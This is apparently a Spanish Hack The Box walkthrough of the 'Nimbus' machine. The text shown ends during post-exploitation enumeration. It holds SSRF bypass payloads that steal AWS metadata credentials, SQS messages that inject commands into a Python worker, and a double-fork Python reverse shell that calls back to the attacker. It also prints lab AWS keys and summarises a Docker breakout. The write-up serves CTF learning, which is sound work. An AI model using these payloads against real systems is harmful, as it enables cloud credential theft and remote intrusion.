---
title: "Nimbus - Hack The Box"
date: 2026-06-26
unlock_date: 2026-11-07
draft: false
slug: "htb-writeup-nimbus"
excerpt: "Esta fue una máquina muy difícil. Después de analizar los escaneos y de analizar el funcionamiento de la página web activa en el puerto 80, que resulta ser una carga de instrucciones YAML o de URLs que apunten a archivos YAML, esto con el fin de cargar trabajos de manera interna. Realizamos un bypass hacia esta funcionalidad YAML para aplicar Server-Side Request Forgery (SSRF), lo que nos permite ver archivos internos de la página web, como lo son credenciales de AWS. Después de exportar esas credenciales y de enumerar el AWS con awscli, vemos que existe una cola SQS que permite solo enviar mensajes. Utilizamos esa función para probar si la funcionalidad de YAML es vulnerable a inyección de comandos (CI), logrando identificar un parámetro que permite ejecutar comandos usando Python. Abusamos de esta vulnerabilidad para cargar una Reverse Shell de Python, que nos permite ganar acceso a la máquina, que resulta ser un contenedor de Docker. Enumerando el contenedor, descubrimos que tiene configurada la funcionalidad proc y que podemos crear proyectos privilegiados con CodeBuild. Creamos un proyecto que puede cargar la ruta de un script, que contiene una Reverse Shell, en el archivo modprobe que está dentro de la ruta /proc/sys/kernel/modprobe para que haga una llamada al kernel y se ejecute nuestro script, todo esto para aplicar un Docker Breakout, siendo así que logramos obtener una sesión de la máquina host como Root."
categories: ["HackTheBox", "Hard Machine"]
tags: ["Linux", "Cloud", "AWS", "LocalStack AWS", "Floci", "SSH", "Docker", "Web Enumeration", "BurpSuite", "Server-Side Request Forgery (SSRF)", "SSRF Bypass", "AWS Enumeration", "Wireshark", "Command Injection (CI)", "Abusing SQS Message Functionality (CI)", "Docker Enumeration", "Docker Breackout", "Abusing CodeBuild PrivilegedMode in LocalStack AWS", "Abusing Kernel Function modprobe", "Privesc - Docker Breackout", "Privesc - Abusing CodeBuild PrivilegedMode in LocalStack AWS", "Privesc - Abusing Kernel Function modprobe", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "echo"
  - "wappalizer"
  - "python3"
  - "export"
  - "env"
  - "grep"
  - "BurpSuite"
  - "Wireshark"
  - "awscli"
  - "aws sts"
  - "aws sqs"
  - "tcpdump"
  - "nc"
  - "hostname"
  - "aws codebuild"
  - "aws s3"
  - "curl"
  - "linpeas.sh"
  - "cat"
links:
  - "https://hackviser.com/tactics/pentesting/web/ssrf"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-an-encoded-ip-address"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md#ssrf-url-for-aws"
  - "https://github.com/arainho/awesome-api-security"
  - "https://rodelllemit.medium.com/aws-pentesting-abusing-overly-permissive-sqs-queue-156297205afe"
  - "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sts-enum.html"
  - "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sqs-and-sns-enum.html"
  - "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-post-exploitation/aws-sqs-post-exploitation/index.html"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://kubehound.io/reference/attacks/CE_UMH_CORE_PATTERN/"
  - "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-codebuild-enum.html"
  - "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc/index.html"
  - "https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a"
  - "https://hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/sensitive-host-mounts.html"
  - "https://github.com/b4rdia/HackTricks/blob/master/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts.md"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-nimbus/nimbus.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.17.180
PING 10.129.17.180 (10.129.17.180) 56(84) bytes of data.
64 bytes from 10.129.17.180: icmp_seq=1 ttl=63 time=68.0 ms
64 bytes from 10.129.17.180: icmp_seq=2 ttl=63 time=67.1 ms
64 bytes from 10.129.17.180: icmp_seq=3 ttl=63 time=158 ms
64 bytes from 10.129.17.180: icmp_seq=4 ttl=63 time=67.7 ms

--- 10.129.17.180 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 67.082/90.265/158.353/39.311 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.17.180 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 18:57 -0600
Initiating SYN Stealth Scan at 18:57
Scanning 10.129.17.180 [65535 ports]
Discovered open port 80/tcp on 10.129.17.180
Discovered open port 22/tcp on 10.129.17.180
Completed SYN Stealth Scan at 18:57, 21.35s elapsed (65535 total ports)
Nmap scan report for 10.129.17.180
Host is up, received user-set (0.27s latency).
Scanned at 2026-06-20 18:57:07 CST for 21s
Not shown: 46594 closed tcp ports (reset), 18939 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
           Raw packets sent: 105152 (4.627MB) | Rcvd: 47008 (1.880MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente vemos 2 puertos abiertos, así que supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 10.129.17.180 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 18:57 -0600
Nmap scan report for 10.129.17.180
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias a este escaneo, vemos que la página web activa del **puerto 80** ocupa **Nginx 1.24.0** y nos indica que se redirecciona a un dominio, así que vamos a registrar ese dominio en el `/etc/hosts`:
```bash
echo "10.129.17.180 nimbus.htb" >> /etc/hosts
```
Y entremos a esa página web para comenzar.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura1.png">
</p>

Parece ser una página que tiene distintos usos de manera interna, como realizar backups, agendar trabajos, etc.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura2.png">
</p>

No hay mucho que destacar.

Analizando la página principal, podemos ver bastantes cosillas:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura3.png">
</p>

Lo más destacable es:
* Parece que podemos cargar un **YAML** o usar una URL que apunte a un **archivo YAML**.
* Pueden aprobarnos una **llave SSH** para entrar en la máquina, esto por el DevOps que al parecer es alguien llamado **Marcus**.
* Vemos que **Nimbus** está en su **versión 1.4.2**.

Moviéndonos a la sección **Submit Job** podemos ver dónde añadir la URL que apunte a un **archivo YAML** o también podemos añadir las instrucciones de **YAML**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura4.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura5.png">
</p>

También vemos un ejemplo que podemos usar y vemos un mensaje importante: al usar la URL, nos advierten que no podremos apuntar a direcciones internas o apuntar a otros endpoints.

Esto podría complicar el aplicar 2 vulnerabilidades como **YAML Deserialization** y **Server-Side Request Forgery (SSRF)**, pero hay que testearlo.

Al entrar en la sección **Sign In**, nos mencionan que se encuentra desactivado y mencionan lo mismo de la **llave SSH**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura6.png">
</p>

Haciendo **Hovering** en la página principal, vemos que podemos consultar 2 subpáginas, pero solo 1 de estas funcionará y nos redirigirá a un endpoint de una **API**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura8.png">
</p>

En dicho endpoint llamado **health**, se nos muestra el uso de un servicio de **AWS**, que también nos muestra un subdominio.

Al registrarlo en el `/etc/hosts` y consultar ese subdominio, nos mostrará un mensaje de que el token de seguridad es inválido:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura9.png">
</p>

De momento, es todo lo que podemos encontrar.

#### Probando Funcionalidad de YAML {#YAML}

Vamos a crear un **archivo YAML** usando el ejemplo que nos mostraron y lo mandaremos a llamar para ver la respuesta que obtendremos.

Crea el **archivo YAML** y levanta un servidor con **Python3**:
```bash
cat test.yaml
name: test
schedule: "* * * * *"
runtime: python3.11

python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Utilicemos la URL que apunta a nuestro archivo local en la página **Submit Job** y veamos la respuesta:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura10.png">
</p>

Nuestro archivo fue aceptado, así que quizá podamos encontrar una forma de inyectar algo con esta función.

Si apuntamos a un recurso interno, por ejemplo `http://localhost/jobs`, nos pedirá que apuntemos a un **archivo YAML**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura11.png">
</p>

Y si intentamos apuntar a un **archivo interno YAML**, por ejemplo `http://127.0.0.1:9999/test.yaml`, nos mostrará un mensaje de advertencia:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura12.png">
</p>

Por último, observa la respuesta que obtenemos al cargar instrucciones **YAML** desde la web:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura13.png">
</p>

Vemos un mensaje sobre quién va a aprobar nuestro **Job** cargado.

Como mencioné anteriormente, es posible que podamos aplicar un **YAML Deserialization attack** o tratar de aplicar un bypass que nos permita ejecutar un **SSRF**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Bypass para Ejecutar Server-Side Request Forgery (SSRF) {#SSRF}

Probando algunos payloads para aplicar un bypass, descubrimos que se puede utilizar la IP de localhost codificada en decimal y en octal. 

Estos payloads los podemos encontrar en el siguiente repositorio:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-an-encoded-ip-address" target="_blank">Repositorio de swisskyrepo: Server-Side Request Forgery - Bypass Using an Encoded IP Address</a>

Y recordemos que se debe apuntar a un **archivo YAML**, así que probemos los siguientes payloads:
```bash
http://2130706433/test.yaml
http://0177.0.0.1/test.yaml
```

Prueba cualquiera de los dos:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura14.png">
</p>

Excelente, acabamos de aplicar un bypass.

Ahora, podemos intentar apuntar a un recurso que permita ejecutar una **Reverse Shell**, pero en mi caso no funcionó.

Entonces, intentemos apuntar a recursos internos, que, viendo el uso de **AWS**, podemos apuntar a alguno que contenga sus credenciales.

Te dejo este repositorio que contiene algunos payloads que podemos probar:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md#ssrf-url-for-aws" target="_blank">Repositorio de swisskyrepo: SSRF URL for Cloud Instances - SSRF URL for AWS</a>

En este mismo repositorio, veremos que la IP utilizada para **AWS** es `169.254.169.254` e igual nos muestran la codificada en decimal, siendo `2852039166`.

La cuestión aquí es que se debe apuntar a un **archivo YAML** para que funcione, entonces tenemos que encontrar una forma de aplicar un bypass a esto también.

Una forma de hacerlo es utilizando query strings de esta forma:
```bash
/#test.yaml
/?test.yaml
/?a=test.yaml
/?foo=.yaml
```

Utilizando esto, podemos apuntar a una instancia de **AWS** siendo la ruta `/latest/meta-data/`, quedando de esta forma:
```bash
http://2852039166/latest/meta-data/?test.yaml
```

Probemos:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura15.png">
</p>

Perfecto, logramos aplicar un segundo bypass y consultamos la instancia de metadata de **AWS**.

Obtengamos las credenciales de seguridad que están almacenadas en esta instancia, pero primero necesitamos el rol activo y luego utilizamos ese rol para obtener sus credenciales:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura16.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura17.png">
</p>

Muy bien, podemos utilizar estas credenciales para enumerar el **servicio AWS** y ver qué podemos encontrar.

### Enumeración Interna de Servicio AWS {#AWS}

Primero, exportemos como variables de entorno estas credenciales; usaremos la región que vimos en la página y usaremos como endpoint el subdominio que encontramos para que nuestras peticiones apunten a este:
```bash
export AWS_ACCESS_KEY_ID='<AccessKeyId>'
export AWS_SECRET_ACCESS_KEY='<SecretAccessKey>'
export AWS_SESSION_TOKEN='<Token>'
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://aws.nimbus.htb
```

Puedes confirmar si se exportaron correctamente con el comando env y buscando **AWS**:
```bash
env | grep AWS
```

Para poder hacer enumeración del servicio **AWS**, podemos utilizar la herramienta **aws cli** que podemos instalar de la siguiente forma:
```bash
sudo apt update
sudo apt install awscli
```

Y te dejo los siguientes blogs sobre enumeración de **AWS**:
* <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sqs-and-sns-enum.html" target="_blank">HackTricks Cloud: AWS - SQS Enum</a>
* <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-post-exploitation/aws-sqs-post-exploitation/index.html" target="_blank">HackTricks Cloud: AWS - SQS Post Exploitation</a>
* <a href="https://rodelllemit.medium.com/aws-pentesting-abusing-overly-permissive-sqs-queue-156297205afe" target="_blank">AWS Pentesting: Abusing overly permissive SQS Queue</a>

Además, antes de comenzar con la enumeración, vamos a ver algunas definiciones que nos pueden ayudar a entender el ambiente de cloud al que nos enfrentamos.

| **AWS STS (Security Token Service)** |
|:------------------------------------:|
| *AWS Security Token Service (STS) es un servicio de AWS que proporciona credenciales de seguridad temporales para acceder de forma autenticada a los recursos de una cuenta de AWS. Estas credenciales, compuestas por un Access Key ID, un Secret Access Key y un Session Token, tienen una duración limitada y se utilizan para otorgar acceso seguro y temporal a usuarios, aplicaciones o servicios, reduciendo la necesidad de emplear credenciales permanentes y mejorando la seguridad del entorno.* |

| **Amazon SQS (Simple Queue Service)** |
|:-------------------------------------:|
| *Amazon SQS (Simple Queue Service) es un servicio administrado de mensajería de AWS que permite a aplicaciones intercambiar mensajes de forma confiable, escalable y asíncrona. Proporciona la infraestructura necesaria para enviar, almacenar y recibir mensajes sin que el usuario tenga que administrar servidores o sistemas de mensajería. En otras palabras, SQS es el servicio que AWS ofrece para gestionar el intercambio de mensajes entre aplicaciones.* |

| **Amazon Queue (Cola)** |
|:-----------------------:|
| *Una queue (cola) en AWS es un recurso que almacena mensajes temporalmente para que otra aplicación los procese más tarde. En el contexto de Amazon SQS, una cola es el componente central donde se depositan y desde donde se leen los mensajes. * |

| **Amazon Resource Name (ARN)** |
|:------------------------------:|
| *Un ARN (Amazon Resource Name) es un identificador único que utiliza AWS para referirse a cualquier recurso dentro de su infraestructura. Funciona de manera similar a una ruta o una dirección completa que indica exactamente de qué recurso se trata y dónde se encuentra. Es similar a indicar rutas de archivos en Linux.* |

Probando qué podemos realizar con las credenciales que obtuvimos, veamos la información de nuestro perfil de **AWS**:
```bash
aws sts get-caller-identity
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```
Observa que podemos ver nuestro **UserId**, **Account** y, lo más importante, un recurso disponible en **AWS** que nos indica que estamos usando un rol llamado **nimbus-web-role**, siendo posiblemente un rol temporal del **IAM**.

Ahora veamos las colas disponibles:
```bash
aws sqs list-queues
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```
Hay una cola disponible que apunta a un endpoint configurado.

Con **SQS** podemos ver todos los atributos de ese endpoint:
```bash
aws sqs get-queue-attributes --queue-url "http://floci:4566/847219365028/nimbus-jobs" --attribute-names All
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1782504173",
        "LastModifiedTimestamp": "1782504173",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}
```
Lo más interesante de los atributos mostrados es el atributo **VisibilityTimeout**, pues este muestra que al enviar un mensaje se vuelve visible por 30 segundos y, después de ese tiempo, si es que se tuvo un flujo correcto, se elimina el mensaje.

Mandemos un mensaje a la cola disponible:
```bash
aws sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "test"
{
    "MD5OfMessageBody": "098f6bcd4621d373cade4e832627b4f6",
    "MessageId": "6a96a251-ff86-498a-a346-40808bed5100"
}
```
El mensaje se envió correctamente y observa cómo se transformó en un **Hash MD5**.

Aunque si volvemos a ver los atributos, no veremos un cambio y tampoco veremos que se haya registrado nuestro mensaje:
```bash
aws sqs get-queue-attributes --queue-url "http://floci:4566/847219365028/nimbus-jobs" --attribute-names All
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1782504173",
        "LastModifiedTimestamp": "1782504173",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}
```

La cuestión es que, al ver el nombre de la cola, podemos intuir que podemos interactuar con la misma función de la página web y podemos cargar instrucciones **YAML**:
```bash
aws sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '{"name": "nightly-db-backup","schedule": "* * * * *","runtime": "python3.11"}'
{
    "MD5OfMessageBody": "119f71dab47ad45558011073c9cc7852",
    "MessageId": "978cae1e-36b6-40a3-8008-b0727aabfc6b"
}
```
Observa que se aceptó nuestro mensaje.

Quizá podamos abusar de esto para interactuar directamente con esa funcionalidad y así poder aplicar **YAML Deserialization** o **Inyección de Comandos (CI)**.

### Fuzzeo de Atributos para Aplicar Inyección de Comandos (CI) con Mensajes SQS de AWS y Ganando Acceso a la Máquina Víctima {#Fuzz}

Al ver que se referencia a la función de **YAML**, quizá podamos aplicar **inyección de comandos (CI),** pero tenemos algunos problemas que tomar en cuenta:

Antes de comenzar, necesitamos tener en cuenta lo siguiente:
* Nuestros mensajes no están siendo registrados en la cola.
* Si se llega a ejecutar un comando, no tendremos una forma de verlo.
* Se debe respetar el formato en el que se registran los nuevos **jobs**.
* Dado que se usa la función `safe_load()` podemos intuir que las instrucciones de un **job** se deserializan y se convierten en instrucciones de **Python**.

Entonces, es más probable que se pueda hacer una **Inyección de Comandos (CI)** dentro de un parámetro que se utilice por el servicio de la página web.

Podríamos enviarnos una **traza ICMP** para ver si obtenemos alguna respuesta y así comprobar si se ejecutó nuestro comando (aunque también podemos meter directamente una **Reverse Shell**):
```bash
aws sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '{"command": "import os; os.system(\"ping Tu_IP\")"}'
{
    "MD5OfMessageBody": "53ef78db0d9a2d89f6df68346bd64148",
    "MessageId": "9cfb4292-5db1-413d-abc2-fa7eb88670a5"
}
```
Podríamos mandar un mensaje como este.

Levantamos el capturador **tcpdump** para que capture **paquetes ICMP**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
El problema de esto es que no obtendremos ninguna respuesta.

Algo que podemos hacer es aplicar **Fuzzing** con un ataque **Sniper Attack** utilizando **Intruder** de **BurpSuite**. (Gracias **Vic**, por la PoC que me mostraste)

Al analizar el tráfico de red con **Wireshark** y después de enviar un mensaje con **SQS**, podemos observar un **paquete HTTP** que se envía, siendo este el mensaje **SQS**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura18.png">
</p>

Podemos analizar mejor esa petición si la seguimos con **TCP Stream**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura19.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura20.png">
</p>

Esta misma petición la podemos copiar y probar en el **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura21.png">
</p>

Ahora podemos mandarla a la herramienta **Intruder** de **BurpSuite**, pero para que el ataque sea más rápido, usaremos la extensión **Turbo Intruder**, quedando el ataque de esta forma:

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura22.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nimbus/Captura23.png">
</p>

De entre todas las respuestas, no veremos ninguna que se diferencie de la otra, pues el tamaño, la cantidad de palabras, etc; son casi identicos.

Sin embargo, revisando **tcpdump** podemos ver que sí se ejecutó nuestro comando:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:21:39.345579 IP 10.129.20.17 > Tu_IP: ICMP echo request, id 1, seq 819, length 64
18:21:39.345599 IP Tu_IP > 10.129.20.17: ICMP echo reply, id 1, seq 819, length 64
...
...
```
Entonces, alguno de los parámetros sí funcionó.

Cambiemos el comando por una **Reverse Shell** de **Python** y cámbialo en el mismo ataque.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Vuelve a ejecutar el ataque ya con la **Reverse Shell** configurada y esperemos la respuesta en el listener:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.20.17] 39560
worker@3f18e484076a:/app$ whoami
whoami
worker
```
Estamos dentro, pero la sesión dura solamente 30 segundos, siendo algo que ya vimos que hace la cola cuando la analizamos antes.

Te recomiendo utilizar la siguiente **Reverse Shell**:
```bash
"import os,subprocess,pty,socket\nif os.fork()==0:\n os.setsid()\n if os.fork()==0:\n  os.umask(0);s=socket.socket();s.connect((\"Tu_IP\",4433))\n  for f in(0,1,2):os.dup2(s.fileno(),f)\n  pty.spawn(\"bash\")\n os._exit(0)\nos._exit(0)"}'
```
Este payload utiliza la técnica clásica de **doble fork (double fork)**, muy utilizada para crear procesos independientes (**daemons**), siendo el motivo por el que ya no se caerá nuestra sesión.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

Y obtengamos la flag del usuario:
```bash
worker@234ecd95bd3f:/app$ cd /home/worker
worker@234ecd95bd3f:~$ ls
user.txt
worker@234ecd95bd3f:~$ cat user.txt
...
```

Dentro del directorio `/app` donde nos encontrábamos, podremos ver el script que ejecuta las instrucciones **YAML** y un análisis rápido muestra que el parámetro que ejecuta las instrucciones de **Python** es el llamado **script**:
```bash
worker@234ecd95bd3f:/app$ ls
requirements.txt  worker.py
worker@234ecd95bd3f:/app$ cat worker.py
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5
...
...
def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)
...
...
```
Prácticamente, la función `handle_message(body)` espera que el mensaje tenga el formato de ejemplo que mostraron, luego deserializa esas instrucciones y ejecuta el contenido del parámetro **script** como comandos de **Python**, siendo la parte vulnerable.

## Post Explotación {#Post}

### Enumeración de Permisos AWS desde Contenedor de Docker {#WorkerAWS}

Antes de comenzar, veamos algunos conceptos clave para la fase de **Post Explotación**:

| **Floci** |
|:---------:|
| *Floci es una plataforma ligera que permite simular servicios de AWS de manera local, proporcionando un entorno para desarrollar, probar y depurar aplicaciones que dependen de servicios de AWS sin necesidad de conectarse a la nube real. Su objetivo es ofrecer una alternativa rápida y sencilla para ejecutar servicios compatibles con AWS durante el desarrollo, reduciendo costos y evitando depender de una conexión a Internet.* |

| **LocalStack AWS** |
|:------------------:|
| *LocalStack es una plataforma de código abierto que emula una amplia variedad de servicios de AWS en un entorno local, permitiendo desarrollar, probar y automatizar aplicaciones sin utilizar recursos reales de AWS.* |

| **CodeBuild** |
|:-------------:|
| *AWS CodeBuild es un servicio de integración continua (Continuous Integration, CI) administrado por AWS que permite compilar código fuente, ejecutar pruebas automatizadas y generar artefactos de software sin necesidad de administrar servidores o infraestructura propia. CodeBuild obtiene el código fuente desde un repositorio (como GitHub o CodeCommit), ejecuta las instrucciones definidas en un archivo buildspec.yml y produce los resultados de la compilación, como ejecutables, paquetes o imágenes de contenedor.* |

| **boto3** |
|:---------:|
| *Boto3 es el SDK (Software Development Kit) oficial de AWS para Python, que proporciona una interfaz para interactuar de forma programática con los servicios de AWS. Mediante boto3, los desarrolladores pueden crear aplicaciones en Python capaces de administrar recursos de AWS, como crear instancias de EC2, cargar archivos a S3, enviar mensajes a SQS, invocar funciones Lambda o consultar bases de datos en DynamoDB, entre muchas otras operaciones.* |

Lo principal que podemos ver es que estamos dentro de un contenedor de **Docker**:
```bash
worker@044f4a8b56ae:~$ hostname -I
172.18.0.3 
worker@044f4a8b56ae:~$ hostname
044f4a8b56ae
```

También revisando las variables de entorno, encontraremos lo siguiente:
```bash
worker@234ecd95bd3f:/app$ env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb
```
Son distintas a las que encontramos antes, por lo que puede que nos permitan realizar más acciones contra el **AWS**.

Realizando varias acciones para ver qué podemos realizar, resulta que podemos listar proyectos de **CodeBuild**:
```bash
worker@044f4a8b56ae:~$ aws codebuild list-projects --endpoint-url http://floci:4566
{
    "projects": []
}
```
No hay ningún proyecto disponible.

Además, encontramos un **Bucket** activo:
```bash
worker@044f4a8b56ae:~$ aws s3 ls --endpoint-url http://floci:4566
2026-07-01 15:59:20 nimbus-dev-artifacts
```

Pero lo más curioso es hacer una consulta con **curl** apuntando al servicio **Floci** que parece albergar **LocalStack AWS**, pues podemos ver que es lo qué está activo:
```bash
worker@044f4a8b56ae:~$ curl http://floci:4566/_localstack/health
